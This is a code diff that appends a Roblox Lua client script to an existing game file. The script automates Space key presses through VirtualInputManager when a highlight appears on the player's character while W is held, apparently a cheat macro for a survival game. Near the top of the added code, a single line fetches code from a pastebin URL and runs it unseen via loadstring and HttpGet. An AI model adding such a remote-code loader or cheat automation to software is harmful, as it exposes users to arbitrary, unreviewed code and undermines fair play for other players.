@@ -253,3 +253,113 @@ srvRun.Heartbeat:Connect(function()
 		end
 	end
 end)
+wait(0.5)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local VIM = game:GetService("VirtualInputManager")
+
+loadstring(game:HttpGet("https://pastebin.com/raw/MzKS5uvm"))()
+
+local function getBehaviorFolder()
+    return ReplicatedStorage:WaitForChild("Assets")
+        :WaitForChild("Survivors")
+        :WaitForChild("Veeronica")
+        :WaitForChild("Behavior")
+end
+
+local behaviorFolder = getBehaviorFolder()
+local monitored = {}
+local holdingW = false
+
+-- Track W key hold state
+UserInputService.InputBegan:Connect(function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.W then
+        holdingW = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, processed)
+    if input.KeyCode == Enum.KeyCode.W then
+        holdingW = false
+    end
+end)
+
+local function adorneeIsPlayerCharacter(h)
+    local adornee = h.Adornee
+    local char = player.Character
+    if not adornee or not char then return false end
+
+    if adornee == char then return true end
+    if adornee:IsDescendantOf(char) then return true end
+
+    return false
+end
+
+local function pressSpace()
+    pcall(function()
+        VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
+        task.wait(0.02)
+        VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
+    end)
+end
+
+local function monitorHighlight(h)
+    if monitored[h] then return end
+    monitored[h] = true
+
+    local lastState = false
+    local active = true
+
+    task.spawn(function()
+        while active and h.Parent do
+            local state = adorneeIsPlayerCharacter(h)
+            if state and holdingW then
+                pressSpace()
+            end
+            task.wait(0.08) -- low load continuous check
+        end
+    end)
+
+    local function evaluate()
+        if not h or not h.Parent then
+            active = false
+            monitored[h] = nil
+            return
+        end
+
+        local state = adorneeIsPlayerCharacter(h)
+        if state ~= lastState then
+            if state and holdingW then
+                print("Highlight now on PLAYER:", h:GetFullName())
+                pressSpace()
+            elseif state then
+                print("Highlight detected but W not held:", h:GetFullName())
+            else
+                print("Highlight left player:", h:GetFullName())
+            end
+        end
+        lastState = state
+    end
+
+    h:GetPropertyChangedSignal("Adornee"):Connect(evaluate)
+    h.AncestryChanged:Connect(evaluate)
+    player.CharacterAdded:Connect(evaluate)
+    player.CharacterRemoving:Connect(evaluate)
+    task.defer(evaluate)
+end
+
+for _, d in ipairs(behaviorFolder:GetDescendants()) do
+    if d:IsA("Highlight") then
+        monitorHighlight(d)
+    end
+end
+
+behaviorFolder.DescendantAdded:Connect(function(child)
+    if child:IsA("Highlight") then
+        print("New highlight:", child:GetFullName())
+        monitorHighlight(child)
+    end
+end)
